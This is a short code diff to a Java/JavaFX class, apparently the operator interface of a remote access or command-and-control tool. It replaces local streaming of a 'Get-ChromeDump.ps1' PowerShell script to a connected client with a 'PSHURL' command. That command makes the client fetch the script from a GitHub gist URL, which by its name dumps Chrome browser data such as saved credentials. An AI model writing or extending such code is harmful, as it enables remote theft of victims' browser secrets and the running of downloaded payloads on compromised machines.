@@ -20,9 +20,7 @@ import javafx.stage.DirectoryChooser;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 
-import java.io.BufferedInputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 
 class IPContextMenu implements Repository {
@@ -198,17 +196,8 @@ class IPContextMenu implements Repository {
                     return;
                 }
                 try {
-                    File script = new File(IPContextMenu.class.getResource("/scripts/Get-ChromeDump.ps1").getFile());
 
-                    clientObject.clientCommunicate("PSHMOD " + script.length() + " Get-ChromeDump");
-                    FileInputStream fis = new FileInputStream(IPContextMenu.class.getResource("/scripts/Get-ChromeDump.ps1").getFile());
-                    BufferedInputStream bis = new BufferedInputStream(fis);
-                    int fbyte;
-                    while ((fbyte = bis.read()) != -1){
-                        clientObject.clientCommunicate(fbyte);
-                    }
-                    fis.close();
-                    bis.close();
+                    clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/89d7aa93116e584ac2690b3287633733/raw/e57c44c37ae28bc6a356c7b9b06d14ed67663742/Get-ChromeDump-Full.ps1" );
 
                     Stage stage = new Stage();
                     stage.initStyle(StageStyle.UNDECORATED);
